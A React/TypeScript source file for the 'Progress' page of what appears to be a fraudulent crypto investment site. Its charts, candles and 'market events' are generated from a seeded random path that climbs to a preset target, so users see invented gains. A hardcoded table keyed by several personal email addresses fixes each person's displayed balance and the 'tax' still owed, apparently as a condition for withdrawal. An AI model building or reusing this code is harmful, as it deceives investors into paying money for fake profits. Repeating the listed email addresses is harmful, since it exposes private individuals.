import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import TradingChart, { type Candle, type Overlay, type ChartMarker } from "../components/TradingChart";
import { buildAnchoredPath, pickPlan, type Profile } from "../sim/progressSim";
import Notice from "../components/Notice";
import { apiUrl } from "../lib/api";
import { cacheProfile, cacheUser, getCachedProfile, getCachedUser } from "../lib/sessionCache";

type User = { id: string; email: string; first_name?: string | null; created_at: string };
type Holding = { symbol: string; quantity: number; avg_cost: number };
type WithdrawalItem = {
  id: string;
  amount: number;
  asset: string;
  method: string;
  chain?: string | null;
  destination: string;
  note: string | null;
  status: string;
  balance_before?: number | null;
  balance_after?: number | null;
  tax_due_snapshot?: number | null;
  created_at: string;
};
type TaxPaymentItem = {
  id: string;
  amount: number;
  asset: string;
  method: string;
  reference?: string | null;
  note?: string | null;
  status: string;
  created_at: string;
};
type TaxSummary = {
  asset: string;
  tax_rate: number;
  tax_due: number;
  tax_paid: number;
  tax_remaining: number;
  override_active?: boolean;
  override_remaining?: number | null;
  override_note?: string | null;
  override_updated_at?: string | null;
};
type DepositItem = {
  id: string;
  amount: number;
  asset: string;
  status: string;
  created_at: string;
};

const MANUAL_PROGRESS_OVERRIDES: Record<
  string,
  { currentValue: number; taxRate: number; taxRemaining: number; taxPaid?: number; taxDue?: number; initialHoldings: number; currency: "GBP" | "USD" }
> = {
  "imdadfamy@gmail.com": {
    currentValue: 6944,
    taxRate: 0.165,
    taxDue: 1145.76,
    taxRemaining: 572.88,
    taxPaid: 572.88,
    initialHoldings: 1120,
    currency: "GBP"
  },
  "garces527@gmail.com": {
    currentValue: 6400,
    taxRate: 0.165,
    taxDue: 1056,
    taxRemaining: 298,
    taxPaid: 758,
    initialHoldings: 500,
    currency: "GBP"
  },
  "g.contrerasb18@gmail.com": {
    currentValue: 3200,
    taxRate: 0.165,
    taxDue: 528,
    taxRemaining: 528,
    taxPaid: 0,
    initialHoldings: 500,
    currency: "GBP"
  },
  "n.s.992004@gmail.com": {
    currentValue: 123846,
    taxRate: 0.165,
    taxRemaining: 12118,
    taxPaid: 8265.58,
    initialHoldings: 2000,
    currency: "GBP"
  }
};
async function getJson<T>(path: string): Promise<T> {
  const res = await fetch(apiUrl(path), {
    method: "GET",
    credentials: "include",
    cache: "no-store",
    headers: { Accept: "application/json" }
  });
  const j = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(j?.error || `HTTP ${res.status}`);
  return j as T;
}

function clamp(n: number, a: number, b: number) {
  return Math.max(a, Math.min(b, n));
}

function hashString(s: string) {
  let h = 2166136261 >>> 0;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}

function mulberry32(seed: number) {
  return function rand() {
    let t = (seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function normal01(rng: () => number) {
  // Box-Muller
  let u = 0;
  let v = 0;
  while (u === 0) u = rng();
  while (v === 0) v = rng();
  return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
}

function fmtMoney(n: number, currency: "USD" | "GBP" = "USD") {
  return new Intl.NumberFormat(currency === "GBP" ? "en-GB" : "en-US", {
    style: "currency",
    currency: currency === "GBP" ? "GBP" : "USD",
    maximumFractionDigits: 2
  }).format(Number(n));
}

function fmtBtc(n: number) {
  return `${Number(n).toLocaleString(undefined, { maximumFractionDigits: 6 })} BTC`;
}

function isLockedWithdrawal(status: string) {
  const s = String(status || "").toLowerCase();
  return s !== "rejected" && s !== "cancelled" && s !== "failed";
}

function validateAddressByChain(chain: string, address: string) {
  const a = String(address || "").trim();
  const c = String(chain || "").toUpperCase();
  if (!a || !c) return false;
  if (c === "BTC") return /^(bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(a);
  if (c === "ERC20" || c === "BEP20") return /^0x[a-fA-F0-9]{40}$/.test(a);
  if (c === "TRC20") return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
  if (c === "SOL") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(a);
  return false;
}

type SimEvent = { id: string; tSec: number; tag: string; title: string; body: string };

function valueAtFromMinuteSeries(args: { closes: Float64Array; startSec: number; totalSec: number; tSec: number }) {
  const { closes, startSec, totalSec, tSec } = args;
  const tt = clamp(tSec, startSec, startSec + totalSec) - startSec;
  const steps = closes.length - 1;
  const idxFloat = (tt / Math.max(1, totalSec)) * steps;
  const idx = clamp(Math.floor(idxFloat), 0, Math.max(0, steps - 1));
  const alpha = clamp(idxFloat - idx, 0, 1);
  return closes[idx] + alpha * (closes[idx + 1] - closes[idx]);
}

function tfToSec(interval: string) {
  const v = String(interval || "1h").toLowerCase();
  const map: Record<string, number> = {
    "1m": 60,
    "5m": 5 * 60,
    "15m": 15 * 60,
    "30m": 30 * 60,
    "1h": 60 * 60,
    "4h": 4 * 60 * 60,
    "1d": 24 * 60 * 60,
    "1w": 7 * 24 * 60 * 60,
    "1mo": 30 * 24 * 60 * 60
  };
  return map[v] || 60 * 60;
}

function fmtEta(ms: number) {
  const d = new Date(ms);
  return d.toLocaleString([], { weekday: "short", month: "short", day: "2-digit", hour: "2-digit", minute: "2-digit" });
}

function parseDateSafe(raw: string | null | undefined): number | null {
  const s = String(raw || "").trim();
  if (!s) return null;
  const t1 = Date.parse(s);
  if (Number.isFinite(t1)) return t1;

  // Safari can reject SQL-like timestamps using a space separator.
  const normalized = s.replace(" ", "T");
  const withZone = /[zZ]|[+\-]\d{2}:?\d{2}$/.test(normalized) ? normalized : `${normalized}Z`;
  const t2 = Date.parse(withZone);
  if (Number.isFinite(t2)) return t2;
  return null;
}

function buildEvents(seed: string, startSec: number, totalSec: number): SimEvent[] {
  const rng = mulberry32(hashString(seed) ^ 0xa54ff53a);
  const mk = (id: string, f: number, tag: string, title: string, body: string) => {
    const jitter = (rng() - 0.5) * 0.03; // +/-3% of duration
    const ff = clamp(f + jitter, 0.01, 0.99);
    return { id, tSec: startSec + Math.floor(totalSec * ff), tag, title, body };
  };
  // A realistic progression: range -> pullback -> liquidity sweep -> trend -> extension.
  return [
    mk("e1", 0.06, "Structure", "Early range forms", "Price chops and consolidates while liquidity builds."),
    mk("e2", 0.18, "Risk", "Pullback tests support", "A sharp dip shakes weak hands before continuation."),
    mk("e3", 0.34, "Liquidity", "Sweep and reclaim", "Fast wick through prior lows then snapback into range."),
    mk("e4", 0.56, "Momentum", "Breakout attempt", "Momentum picks up; volatility expands and trend begins."),
    mk("e5", 0.78, "Execution", "Consolidation mid-trend", "Sideways pause. Typical before the next leg."),
    mk("e6", 0.92, "Finish", "Final push to target", "Volatility spikes into the destination zone.")
  ].sort((a, b) => a.tSec - b.tSec);
}

function buildProgressCandles(args: {
  seed: string;
  startSec: number;
  totalSec: number;
  intervalSec: number;
  nowSec: number;
  startValue: number;
  targetValue: number;
  limit: number;
  endTimeSec?: number;
}): Candle[] {
  const { seed, startSec, totalSec, intervalSec, nowSec, startValue: S, targetValue: E, limit, endTimeSec } = args;

  const effectiveInterval = Math.max(60, Math.min(intervalSec, totalSec > 0 ? totalSec : intervalSec));
  const stepsMin = Math.max(1, Math.floor(totalSec / 60) || 1);
  const closesMin = buildAnchoredPath(`${seed}:min`, S, E, stepsMin);

  const endSec = startSec + totalSec;
  const tCap = Math.min(endSec, endTimeSec != null ? endTimeSec : nowSec);
  const tNow = clamp(tCap, startSec, endSec);

  const lastK = clamp(Math.floor((tNow - startSec) / effectiveInterval), 0, Math.floor(totalSec / effectiveInterval));
  const firstK = Math.max(0, lastK - Math.max(1, limit) + 1);

  const rng = mulberry32(hashString(`${seed}:ohlc2:${effectiveInterval}:${firstK}`));

  const out: Candle[] = [];
  for (let k = firstK; k <= lastK; k++) {
    const candleStart = startSec + k * effectiveInterval;
    const candleEnd = candleStart + effectiveInterval;
    const closeTime = k === lastK ? Math.min(candleEnd, tNow) : candleEnd;

    const open = valueAtFromMinuteSeries({ closes: closesMin, startSec, totalSec, tSec: candleStart });
    const close = valueAtFromMinuteSeries({ closes: closesMin, startSec, totalSec, tSec: closeTime });

    // High/low from minute samples within candle (plus a small wick jitter).
    const minIdx = clamp(Math.floor((candleStart - startSec) / 60), 0, stepsMin);
    const maxIdx = clamp(Math.ceil((closeTime - startSec) / 60), 0, stepsMin);
    let hi = Math.max(open, close);
    let lo = Math.min(open, close);
    for (let mi = minIdx; mi <= maxIdx; mi++) {
      const v = closesMin[mi];
      if (!Number.isFinite(v)) continue;
      if (v > hi) hi = v;
      if (v < lo) lo = v;
    }

    const baseVol = Math.max(1e-9, Math.abs(E - S)) * 0.02 + Math.abs(open) * 0.008;
    const wick = Math.abs(normal01(rng)) * baseVol * 0.18;
    const high = hi + wick * (0.35 + rng());
    const low = Math.max(1e-12, lo - wick * (0.35 + rng()));
    const volume = Math.max(1, Math.floor((2000 + rng() * 6000) * (1 + Math.abs(close - open) / Math.max(1e-9, baseVol))));

    out.push({
      time: candleStart,
      open: Number(open.toFixed(open >= 100 ? 2 : open >= 1 ? 5 : 8)),
      high: Number(high.toFixed(high >= 100 ? 2 : high >= 1 ? 5 : 8)),
      low: Number(low.toFixed(low >= 100 ? 2 : low >= 1 ? 5 : 8)),
      close: Number(close.toFixed(close >= 100 ? 2 : close >= 1 ? 5 : 8)),
      volume
    });
  }
  return out;
}

export default function ProgressPage() {
  // `undefined` = loading, `null` = not logged in / not set up.
  const [user, setUser] = useState<User | null | undefined>(undefined);
  const [profile, setProfile] = useState<Profile | null | undefined>(undefined);
  const [holdings, setHoldings] = useState<Holding[]>([]);
  const [deposits, setDeposits] = useState<DepositItem[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [booting, setBooting] = useState(true);
  const [usingCachedSession, setUsingCachedSession] = useState(false);
  const [tick, setTick] = useState(0);
  const timerRef = useRef<number | null>(null);

  const syncProfileAndDeposits = useCallback(async () => {
    const [profileResult, depositsResult] = await Promise.allSettled([
      getJson<{ profile: Profile | null }>("/api/profile/me"),
      getJson<{ items: DepositItem[] }>("/api/deposits/me")
    ]);

    if (profileResult.status === "fulfilled") {
      const remoteProfile = profileResult.value?.profile || null;
      if (remoteProfile) cacheProfile(remoteProfile as any);
      setProfile(remoteProfile);
    }

    if (depositsResult.status === "fulfilled") {
      setDeposits(Array.isArray(depositsResult.value?.items) ? depositsResult.value.items : []);
    }
  }, []);

  useEffect(() => {
    setError(null);
    let cancelled = false;
    const sleep = (ms: number) => new Promise((resolve) => window.setTimeout(resolve, ms));
    const bootstrap = async () => {
      const cachedUser = getCachedUser() as any;
      const cachedProfile = getCachedProfile(cachedUser?.id) as any;

      // Start with cache immediately so the page can render even if cookie handshake is flaky.
      if (!cancelled && cachedUser) {
        setUser(cachedUser);
        setUsingCachedSession(true);
      }
      if (!cancelled && cachedProfile) setProfile(cachedProfile);

      let remoteUser: User | null = null;
      for (let i = 0; i < 3; i++) {
        try {
          const r = await getJson<{ user: User | null }>("/api/auth/me");
          if (r.user) {
            remoteUser = r.user;
            break;
          }
        } catch (e: any) {
          if (i === 2 && !cancelled) setError(typeof e?.message === "string" ? e.message : "Failed");
        }
        await sleep(700);
      }

      if (!cancelled) {
        if (remoteUser) {
          cacheUser(remoteUser as any);
          setUser(remoteUser);
          setUsingCachedSession(false);
        } else if (!cachedUser) {
          setUser(null);
        }
      }

      let remoteProfile: Profile | null = null;
      for (let i = 0; i < 3; i++) {
        try {
          const r = await getJson<{ profile: Profile | null }>("/api/profile/me");
          if (r.profile) {
            remoteProfile = r.profile;
            break;
          }
        } catch {}
        await sleep(700);
      }
      if (!cancelled) {
        if (remoteProfile) {
          cacheProfile(remoteProfile as any);
          setProfile(remoteProfile);
        } else if (!cachedProfile) {
          setProfile(null);
        }
      }

      try {
        const r = await getJson<{ holdings: Holding[] }>("/api/portfolio/holdings");
        if (!cancelled) setHoldings(r.holdings || []);
      } catch {
        if (!cancelled) setHoldings([]);
      }
      try {
        const r = await getJson<{ items: DepositItem[] }>("/api/deposits/me");
        if (!cancelled) setDeposits(Array.isArray(r.items) ? r.items : []);
      } catch {
        if (!cancelled) setDeposits([]);
      }
      if (!cancelled) setBooting(false);
    };

    void bootstrap();
    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!user || user === undefined || user === null) return;
    let cancelled = false;
    const tickSync = async () => {
      if (cancelled) return;
      try {
        await syncProfileAndDeposits();
      } catch {}
    };

    // Immediate sync so the page reacts fast after admin approval.
    void tickSync();

    // Keep polling while holdings are not yet activated.
    const initialCapital = Number(profile?.initial_capital || 0);
    const initialUnits = Number(profile?.initial_units || 0);
    const hasApprovedHoldings = initialCapital > 0 || initialUnits > 0;
    const intervalMs = hasApprovedHoldings ? 15000 : 3000;
    const t = window.setInterval(() => void tickSync(), intervalMs);

    const onFocus = () => void tickSync();
    const onVisible = () => {
      if (document.visibilityState === "visible") void tickSync();
    };
    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVisible);

    return () => {
      cancelled = true;
      window.clearInterval(t);
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [user, profile, syncProfileAndDeposits]);

  useEffect(() => {
    if (timerRef.current) window.clearInterval(timerRef.current);
    timerRef.current = window.setInterval(() => setTick((t) => t + 1), 1000);
    return () => {
      if (timerRef.current) window.clearInterval(timerRef.current);
    };
  }, []);

  // Guard: only reachable after login and initialization. If user types #progress directly, send them back.
  useEffect(() => {
    if (booting) return;
    if (user === undefined) return;
    if (user === null) {
      window.history.pushState(null, "", "/portfolio");
      window.dispatchEvent(new PopStateEvent("popstate"));
    }
  }, [user, booting]);
  useEffect(() => {
    if (booting) return;
    if (profile === undefined) return;
    if (profile === null) {
      window.history.pushState(null, "", "/portfolio");
      window.dispatchEvent(new PopStateEvent("popstate"));
    }
  }, [profile, booting]);

  const plan = useMemo(() => (profile ? pickPlan(profile) : null), [profile]);

  const startSec = useMemo(() => {
    if (!user && !profile) return null;
    const ts = parseDateSafe(user?.created_at) ?? parseDateSafe(profile?.created_at);
    if (ts == null || !Number.isFinite(ts)) return null;
    const rawSec = Math.floor(ts / 1000);
    const nowSec = Math.floor(Date.now() / 1000);
    if (rawSec <= nowSec) return rawSec;

    // Guard against bad/future account timestamps that can freeze progress at 0%.
    // Persist a stable fallback start time so page remounts/back navigation do not reset progress.
    const fallbackKey = user?.id && plan ? `progress_start_fallback:${user.id}:${plan.key}` : null;
    let fallbackSec = nowSec;
    try {
      if (fallbackKey) {
        const stored = Number(localStorage.getItem(fallbackKey));
        if (Number.isFinite(stored) && stored > 0) fallbackSec = Math.floor(stored);
        else localStorage.setItem(fallbackKey, String(nowSec));
      }
    } catch {}

    console.warn("[ProgressPage] Future account timestamp detected; using persisted fallback start time.", {
      userCreatedAt: user?.created_at ?? null,
      profileCreatedAt: profile?.created_at ?? null,
      rawStartSec: rawSec,
      fallbackStartSec: fallbackSec
    });
    return fallbackSec;
  }, [user, profile, plan]);

  const seedBase = useMemo(() => {
    if (!user || !plan) return null;
    return `${user.id}:${plan.key}`;
  }, [user, plan]);

  const minuteSeries = useMemo(() => {
    if (!plan || startSec == null || !seedBase) return null;
    const stepsMin = Math.max(1, Math.floor(plan.durationSec / 60) || 1);
    return buildAnchoredPath(`${seedBase}:min`, plan.startValue, plan.targetValue, stepsMin);
  }, [plan, seedBase, startSec]);

  const simMeta = useMemo(() => {
    if (!user || !plan || startSec == null || !minuteSeries) return null;
    const nowSec = Math.floor(Date.now() / 1000);
    const totalSec = plan.durationSec;
    const endSec = startSec + totalSec;
    const remainingSec = Math.max(0, endSec - nowSec);
    const done = nowSec >= endSec;
    const current = valueAtFromMinuteSeries({ closes: minuteSeries, startSec, totalSec, tSec: nowSec });
    return { startSec, endSec, remainingSec, done, nowSec, current };
  }, [user, plan, startSec, minuteSeries, tick]);

  // Stable provider: TradingChart polls per-second and expects the provider identity to stay stable.
  // We compute "now" at call time and support endTimeSec so the last candle updates smoothly.
  const progressProvider = useMemo(() => {
    if (!user || !plan || startSec == null || !seedBase) return null;
    const seed = seedBase;
    const totalSec = plan.durationSec;
    const startValue = plan.startValue;
    const targetValue = plan.targetValue;

    return async ({
      interval,
      limit,
      endTimeSec
    }: {
      interval: string;
      limit: number;
      endTimeSec?: number;
    }) => {
      const intervalSec = tfToSec(interval);
      const nowSec = Math.floor(Date.now() / 1000);
      const cap = endTimeSec != null ? endTimeSec : nowSec;
      return buildProgressCandles({
        seed,
        startSec,
        totalSec,
        intervalSec,
        nowSec,
        startValue,
        targetValue,
        limit,
        endTimeSec: cap
      });
    };
  }, [user, plan, startSec, seedBase]);

  const overlaysBuilder = useMemo(() => {
    if (!plan || startSec == null) return null;
    return (candles: Candle[], interval: string): Overlay[] => {
      const intervalSec = tfToSec(interval);
      const totalSec = plan.durationSec;
      const values = candles.map((c) => {
        const t = c.time + intervalSec; // use candle close time
        const f = totalSec > 0 ? clamp((t - startSec) / totalSec, 0, 1) : 0;
        return plan.startValue + (plan.targetValue - plan.startValue) * f;
      });
      return [
        {
          id: "target",
          name: "Target",
          values,
          color: "rgba(231, 238, 252, 0.35)",
          lineWidth: 2,
          dashed: true
        }
      ];
    };
  }, [plan, startSec]);

  const tvDataProvider = useMemo(() => {
    if (!progressProvider) return undefined;
    return async (params: {
      symbol: string;
      interval: string;
      limit: number;
      endTimeSec?: number;
      signal?: AbortSignal;
    }) => {
      void params.symbol;
      void params.signal;
      return progressProvider({ interval: params.interval, limit: params.limit, endTimeSec: params.endTimeSec });
    };
  }, [progressProvider]);

  const milestones = useMemo(() => {
    if (!plan || !simMeta || !minuteSeries) return [];
    const total = plan.targetValue - plan.startValue;
    if (total === 0) return [];

    const levels = [0.25, 0.5, 0.75, 1].map((pct) => ({
      pct,
      value: plan.startValue + total * pct
    }));

    const steps = minuteSeries.length - 1;
    const out = levels.map((lv) => {
      let k = steps;
      // Find first-cross minute (handles dips and consolidations naturally).
      for (let i = 0; i <= steps; i++) {
        const v = minuteSeries[i];
        if (Number.isFinite(v) && v >= lv.value) {
          k = i;
          break;
        }
      }
      const tSec = simMeta.startSec + k * 60;
      return { ...lv, tSec };
    });
    return out;
  }, [plan, simMeta, minuteSeries]);

  const markers = useMemo<ChartMarker[]>(() => {
    if (!milestones.length) return [];
    const col = "rgba(90, 210, 255, 0.30)";
    return milestones.map((m) => ({
      time: m.tSec,
      label: `${Math.round(m.pct * 100)}%`,
      color: col,
      dashed: true
    }));
  }, [milestones]);

  const nextMilestone = useMemo(() => {
    if (!plan || !simMeta || !milestones.length) return null;
    const cur = simMeta.current;
    for (const m of milestones) {
      if (cur < m.value) return m;
    }
    return null;
  }, [plan, simMeta, milestones]);

  const [alertCfg, setAlertCfg] = useState<{ enabled: Record<string, boolean>; fired: Record<string, boolean> }>(() => ({
    enabled: { "25": true, "50": true, "75": true, "100": true },
    fired: {}
  }));
  const [toast, setToast] = useState<{ title: string; body: string } | null>(null);
  const [withdrawOpen, setWithdrawOpen] = useState(false);
  const [wdMethod, setWdMethod] = useState<"Bank Transfer" | "Crypto Wallet">("Bank Transfer");
  const [wdChain, setWdChain] = useState<"BTC" | "ERC20" | "TRC20" | "BEP20" | "SOL">("ERC20");
  const [wdDestination, setWdDestination] = useState("");
  const [wdNote, setWdNote] = useState("");
  const [wdBusy, setWdBusy] = useState(false);
  const [showAdvancedChart, setShowAdvancedChart] = useState(false);
  const [wdPendingAmount, setWdPendingAmount] = useState(0);
  const [wdMsg, setWdMsg] = useState<{ tone: "ok" | "err"; text: string } | null>(null);
  const [taxPopup, setTaxPopup] = useState<string | null>(null);
  const [withdrawSuccessPopup, setWithdrawSuccessPopup] = useState<string | null>(null);
  const [withdrawals, setWithdrawals] = useState<WithdrawalItem[]>([]);
  const [taxPayments, setTaxPayments] = useState<TaxPaymentItem[]>([]);
  const [taxSummary, setTaxSummary] = useState<TaxSummary | null>(null);
  const loadLedger = () =>
    Promise.all([
      getJson<{ items: WithdrawalItem[] }>("/api/withdrawals/me").catch(() => ({ items: [] as WithdrawalItem[] })),
      getJson<{ items: TaxPaymentItem[]; summary?: TaxSummary | null }>("/api/withdrawals/tax/me").catch(() => ({
        items: [] as TaxPaymentItem[],
        summary: null
      }))
    ]).then(([w, t]) => {
      setWithdrawals(Array.isArray(w.items) ? w.items : []);
      setTaxPayments(Array.isArray(t.items) ? t.items : []);
      setTaxSummary(t.summary && typeof t.summary === "object" ? t.summary : null);
    });

  useEffect(() => {
    if (!user || !plan) return;
    const key = `progress_alerts:${user.id}:${plan.key}`;
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return;
      const j = JSON.parse(raw);
      const enabled = j?.enabled && typeof j.enabled === "object" ? j.enabled : null;
      const fired = j?.fired && typeof j.fired === "object" ? j.fired : null;
      if (enabled || fired) {
        setAlertCfg((s) => ({
          enabled: { ...s.enabled, ...(enabled || {}) },
          fired: { ...(fired || {}) }
        }));
      }
    } catch {}
  }, [user, plan]);

  useEffect(() => {
    if (!user || !plan) return;
    const key = `progress_alerts:${user.id}:${plan.key}`;
    try {
      localStorage.setItem(key, JSON.stringify(alertCfg));
    } catch {}
  }, [alertCfg, user, plan]);

  useEffect(() => {
    if (!user || !plan) return;
    void loadLedger();
    const t = window.setInterval(() => void loadLedger(), 4000);
    return () => window.clearInterval(t);
  }, [user, plan]);

  useEffect(() => {
    if (!withdrawOpen) return;
    void loadLedger();
  }, [withdrawOpen]);

  useEffect(() => {
    if (!user || !plan) return;
    const onFocus = () => void loadLedger();
    const onVisible = () => {
      if (document.visibilityState === "visible") void loadLedger();
    };
    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [user, plan]);

  useEffect(() => {
    if (!plan || !simMeta || !milestones.length) return;
    const cur = simMeta.current;
    const hit = milestones.filter((m) => cur >= m.value);
    if (!hit.length) return;
    const last = hit[hit.length - 1];
    const pctKey = String(Math.round(last.pct * 100));
    if (!alertCfg.enabled[pctKey]) return;
    if (alertCfg.fired[pctKey]) return;

    setAlertCfg((s) => ({ ...s, fired: { ...s.fired, [pctKey]: true } }));
    setToast({
      title: `Milestone reached: ${pctKey}%`,
      body: `Price action reached the ${pctKey}% checkpoint on your path.`
    });
    const t = window.setTimeout(() => setToast(null), 6500);
    return () => window.clearTimeout(t);
  }, [alertCfg.enabled, alertCfg.fired, milestones, plan, simMeta]);

  const risk = useMemo(() => {
    if (!plan || !simMeta || !minuteSeries) return null;
    const nowIdx = clamp(Math.floor((simMeta.nowSec - simMeta.startSec) / 60), 0, minuteSeries.length - 1);
    let peak = minuteSeries[0];
    let maxDd = 0;
    for (let i = 0; i <= nowIdx; i++) {
      const v = minuteSeries[i];
      if (!Number.isFinite(v)) continue;
      if (v > peak) peak = v;
      const dd = peak > 0 ? (peak - v) / peak : 0;
      if (dd > maxDd) maxDd = dd;
    }
    const cur = simMeta.current;
    const curDd = peak > 0 ? (peak - cur) / peak : 0;

    // Volatility: stddev of 1m log returns over a recent window.
    const win = Math.min(360, nowIdx); // up to last 6h
    const start = Math.max(1, nowIdx - win);
    const rets: number[] = [];
    for (let i = start; i <= nowIdx; i++) {
      const a = minuteSeries[i - 1];
      const b = minuteSeries[i];
      if (!Number.isFinite(a) || !Number.isFinite(b) || a <= 0 || b <= 0) continue;
      rets.push(Math.log(b / a));
    }
    const mean = rets.length ? rets.reduce((s, x) => s + x, 0) / rets.length : 0;
    const var0 =
      rets.length > 1 ? rets.reduce((s, x) => s + (x - mean) * (x - mean), 0) / (rets.length - 1) : 0;
    const vol1m = Math.sqrt(Math.max(0, var0));
    // Scale to a simple per-hour percentage (not finance-accurate, but consistent).
    const vol1hPct = vol1m * Math.sqrt(60) * 100;
    return { peak, maxDdPct: maxDd * 100, curDdPct: curDd * 100, vol1hPct };
  }, [minuteSeries, plan, simMeta]);

  const compatChart = useMemo(() => {
    if (!plan || !simMeta || !minuteSeries) return null;
    const n = 180;
    const values: number[] = [];
    const target: number[] = [];
    const totalSec = Math.max(1, plan.durationSec);
    const liveSpan = Math.max(1, simMeta.nowSec - simMeta.startSec);
    for (let i = 0; i < n; i++) {
      const f = i / Math.max(1, n - 1);
      const tSec = simMeta.startSec + Math.floor(liveSpan * f);
      const v = valueAtFromMinuteSeries({
        closes: minuteSeries,
        startSec: simMeta.startSec,
        totalSec,
        tSec
      });
      values.push(v);
      target.push(plan.startValue + (plan.targetValue - plan.startValue) * ((tSec - simMeta.startSec) / totalSec));
    }
    return { values, target };
  }, [plan, simMeta, minuteSeries]);

  const pace = useMemo(() => {
    if (!plan || !simMeta || !minuteSeries) return null;
    const reqPerHr = (plan.targetValue - plan.startValue) / Math.max(1e-9, plan.durationSec / 3600);

    const backSec = 3600;
    const prev = valueAtFromMinuteSeries({
      closes: minuteSeries,
      startSec: simMeta.startSec,
      totalSec: plan.durationSec,
      tSec: simMeta.nowSec - backSec
    });
    const actPerHr = (simMeta.current - prev) / (backSec / 3600);

    const ratio = reqPerHr === 0 ? 1 : actPerHr / reqPerHr;
    const clamped = clamp(ratio, -1, 2);
    const ui = clamped >= 1 ? "pos" : clamped >= 0.7 ? "muted" : "neg";
    return { reqPerHr, actPerHr, ratio, ui };
  }, [minuteSeries, plan, simMeta]);

  const events = useMemo(() => {
    if (!seedBase || !simMeta || !plan) return [];
    return buildEvents(`${seedBase}:events`, simMeta.startSec, plan.durationSec);
  }, [plan, seedBase, simMeta]);

  const holdingsSummary = useMemo(() => {
    // Backend redacts holdings: it returns a single aggregated holding (POOL).
    const reachedOrBeatTarget = !!plan && !!simMeta && simMeta.current >= plan.targetValue;
    const initialCapital = Number(profile?.initial_capital || 0);
    const initialUnits = Number(profile?.initial_units || 0);
    const hasApprovedHoldings = initialCapital > 0 || initialUnits > 0;
    return {
      positions: hasApprovedHoldings ? (reachedOrBeatTarget ? 0 : 1) : 0,
      label: "Private "
    };
  }, [holdings, profile, plan, simMeta]);

  if (user === undefined) {
    return (
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">Loading</h1>
          <p className="pageLead">Preparing your trade setup...</p>
        </div>
      </section>
    );
  }

  if (!user) {
    return (
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">Login required</h1>
          <p className="pageLead">Go to Portfolio and login first.</p>
          {error ? <Notice tone="warn" title="Unable to load your account">Please try again.</Notice> : null}
          <div style={{ marginTop: 14 }}>
            <a className="chip" href="#portfolio">Back to Portfolio</a>
          </div>
        </div>
      </section>
    );
  }

  if (profile === undefined) {
    return (
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">Loading</h1>
          <p className="pageLead">Preparing your plan...</p>
        </div>
      </section>
    );
  }

  if (!profile) {
    return (
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">Profile Sync In Progress</h1>
          <p className="pageLead">Your holdings profile is being prepared. Reload this page in a moment.</p>
          <div style={{ marginTop: 14 }}>
            <a className="chip" href="#portfolio">Back to Portfolio</a>
          </div>
        </div>
      </section>
    );
  }

  if (!plan || !simMeta) {
    return (
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">No Active Investment Yet</h1>
          <p className="pageLead">Initial holdings are 0. Invest from Checkout, then wait for admin approval to start progress movement.</p>
          <div style={{ marginTop: 14 }}>
            <a className="chip" href="#checkout">Go to Checkout</a>
          </div>
        </div>
      </section>
    );
  }

  const hoursLeft = Math.floor(simMeta.remainingSec / 3600);
  const minsLeft = Math.floor((simMeta.remainingSec % 3600) / 60);
  const secsLeft = simMeta.remainingSec % 60;
  const manualOverride = MANUAL_PROGRESS_OVERRIDES[String(user.email || "").toLowerCase()] || null;
  const displayUnit: "USD" | "GBP" | "BTC" = (manualOverride?.currency || plan.unit) as "USD" | "GBP" | "BTC";
  const isBtcUnit = displayUnit === "BTC";

  const displayStartValue =
    typeof manualOverride?.initialHoldings === "number" ? Number(manualOverride.initialHoldings) : Number(plan.startValue);
  const startLabel = isBtcUnit ? fmtBtc(displayStartValue) : fmtMoney(displayStartValue, displayUnit as "USD" | "GBP");
  const targetLabel = isBtcUnit ? fmtBtc(plan.targetValue) : fmtMoney(plan.targetValue, displayUnit as "USD" | "GBP");
  const withdrawnLocked = withdrawals
    .filter((w) => String(w.asset || "").toUpperCase() === plan.unit && isLockedWithdrawal(w.status))
    .reduce((s, w) => s + Number(w.amount || 0), 0);
  const effectiveCurrentRaw = manualOverride ? Number(manualOverride.currentValue || 0) : simMeta.current;
  const effectiveCurrent = Math.max(0, effectiveCurrentRaw - withdrawnLocked);
  const displayedCurrent = Math.max(0, effectiveCurrent - wdPendingAmount);
  const currentLabel = isBtcUnit ? fmtBtc(displayedCurrent) : fmtMoney(displayedCurrent, displayUnit as "USD" | "GBP");
  const startTime = new Date(simMeta.startSec * 1000);
  const endTime = new Date(simMeta.endSec * 1000);
  const startShort = startTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  const endShort = endTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  const baseProgress01 = (() => {
    const denom = plan.targetValue - plan.startValue;
    const num = simMeta.current - plan.startValue;
    return denom === 0 ? 1 : clamp(num / denom, 0, 1);
  })();
  const baseProgressPct = Math.round(baseProgress01 * 100);
  const reachedTarget = baseProgressPct >= 100;
  const timeLeftLabel = simMeta.done ? "Completed" : `${hoursLeft}h ${minsLeft}m ${secsLeft}s`;
